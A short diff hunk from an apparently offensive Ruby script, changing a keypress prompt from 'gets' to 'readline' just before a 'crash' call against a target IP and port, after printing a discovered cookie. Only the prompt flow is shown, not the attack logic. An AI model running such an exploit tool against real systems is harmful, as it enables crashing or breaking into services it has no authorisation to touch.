@@ -121,7 +121,7 @@ end
 print_info "Found cookie: #{s.hex_escape} #{s.length}"
 
 print_info "PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT #{ip} #{port}"
-gets 
+readline
 
 crash(s,false)
 print_info "#{$count} connections"
